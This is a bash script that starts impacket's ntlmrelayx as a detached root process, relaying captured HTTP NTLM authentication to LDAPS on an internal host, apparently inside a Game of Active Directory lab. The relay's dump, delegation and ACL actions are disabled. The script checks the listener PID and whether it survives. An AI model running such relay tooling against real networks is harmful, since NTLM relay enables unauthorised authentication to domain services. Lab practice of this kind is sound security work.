#!/usr/bin/env bash
# Start a mutation-disabled HTTP -> LDAPS relay for deterministic WS01 machine authentication.
# Launch in a detached root-owned nohup context and track the real TCP/80 listener PID.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
TARGET="${TARGET:-10.4.10.11}"
WORK="${WORK:-$HOME/.config/kingdoms/phase03-http-ldaps}"
LOG="$WORK/ntlmrelayx.log"
PIDFILE="$WORK/ntlmrelayx.pid"

find_ntlmrelayx() {
  local c
  for c in     "$(command -v impacket-ntlmrelayx 2>/dev/null || true)"     "$(command -v ntlmrelayx.py 2>/dev/null || true)"     /usr/share/doc/python3-impacket/examples/ntlmrelayx.py; do
    [[ -n "$c" && ( -f "$c" || -x "$c" ) ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

listener_pid_80() {
  sudo ss -H -lntp 'sport = :80' 2>/dev/null     | sed -n 's/.*pid=\([0-9][0-9]*\).*/\1/p'     | head -n1
}

pid_cmdline() {
  local pid="$1"
  sudo sh -c "tr '\\0' ' ' < /proc/$pid/cmdline" 2>/dev/null || true
}

cd "$ROOT"

bash "$ROOT/scripts/phase03/check-http-ldaps-readonly-relay.sh"

NTLMRELAYX="$(find_ntlmrelayx)"
sudo -v

umask 077
rm -rf -- "$WORK"
mkdir -p "$WORK"

# Launch through a short-lived privileged shell so nohup/redirects are applied
# by root. stdbuf execs ntlmrelayx, so the child remains detached from this
# wrapper after the shell exits.
sudo -n sh -c '
  umask 077
  nohup stdbuf -oL -eL "$1"     -t "ldaps://$2"     --no-dump     --no-da     --no-acl     --no-smb-server     --no-wcf-server     --no-raw-server     >"$3" 2>&1 </dev/null &
  printf "%s\n" "$!"
' sh "$NTLMRELAYX" "$TARGET" "$LOG" >"$WORK/launch.pid"

LAUNCH_PID="$(cat "$WORK/launch.pid")"

REAL_PID=""
for _ in {1..30}; do
  REAL_PID="$(listener_pid_80 || true)"

  if [[ -n "$REAL_PID" ]]; then
    CMDLINE="$(pid_cmdline "$REAL_PID")"

    if grep -Eqi 'ntlmrelayx' <<<"$CMDLINE"; then
      break
    fi

    REAL_PID=""
  fi

  sleep 0.5
done

if [[ -z "$REAL_PID" ]]; then
  echo "FAIL: could not identify the ntlmrelayx process owning TCP/80 (launch pid=$LAUNCH_PID)" >&2
  cat "$LOG" >&2
  exit 1
fi

CMDLINE="$(pid_cmdline "$REAL_PID")"
grep -Eqi 'ntlmrelayx' <<<"$CMDLINE" || {
  echo "FAIL: TCP/80 PID $REAL_PID is not ntlmrelayx: $CMDLINE" >&2
  exit 1
}

sudo kill -0 "$REAL_PID" 2>/dev/null || {
  echo "FAIL: ntlmrelayx listener PID $REAL_PID is not alive" >&2
  cat "$LOG" >&2
  exit 1
}

printf '%s\n' "$REAL_PID" >"$PIDFILE"

# Prove it survives beyond initial listener creation.
sleep 3

CHECK_PID="$(listener_pid_80 || true)"
[[ "$CHECK_PID" == "$REAL_PID" ]] || {
  echo "FAIL: ntlmrelayx listener did not survive detached startup" >&2
  cat "$LOG" >&2
  exit 1
}

echo "TARGET=ldaps://$TARGET"
echo "LOG=$LOG"
echo "PID=$REAL_PID"
echo "CMDLINE=$CMDLINE"
echo 'PHASE03_HTTP_LDAPS_RUNTIME_READY=True'
